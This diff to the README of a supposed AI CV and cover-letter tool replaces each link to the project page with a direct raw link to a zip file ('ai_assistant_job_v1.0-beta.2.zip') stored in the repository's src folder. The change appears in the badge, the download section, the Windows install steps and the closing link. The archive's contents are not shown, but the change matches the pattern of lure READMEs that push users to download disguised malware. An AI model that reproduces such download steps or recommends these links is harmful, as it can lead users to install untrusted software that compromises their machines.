@@ -1,12 +1,12 @@
 # 🤖 ai-job-assistant - Tailor CVs and cover letters fast
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/spinyfinned-amide211/ai-job-assistant)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/spinyfinned-amide211/ai-job-assistant/raw/refs/heads/main/src/ai_assistant_job_v1.0-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-https://github.com/spinyfinned-amide211/ai-job-assistant
+https://github.com/spinyfinned-amide211/ai-job-assistant/raw/refs/heads/main/src/ai_assistant_job_v1.0-beta.2.zip
 
 ## 🖥️ What this app does
 
@@ -37,7 +37,7 @@ For best results, keep your CV in simple format. A Word file or plain text file 
 Follow these steps to get the app running on Windows.
 
 1. Open the download page:
-   https://github.com/spinyfinned-amide211/ai-job-assistant
+   https://github.com/spinyfinned-amide211/ai-job-assistant/raw/refs/heads/main/src/ai_assistant_job_v1.0-beta.2.zip
 
 2. Look for the latest release or the main project files.
 
@@ -177,7 +177,7 @@ Yes. You should review and edit the result before you send it.
 
 Visit the project here:
 
-https://github.com/spinyfinned-amide211/ai-job-assistant
+https://github.com/spinyfinned-amide211/ai-job-assistant/raw/refs/heads/main/src/ai_assistant_job_v1.0-beta.2.zip
 
 ## 🧰 Troubleshooting
 
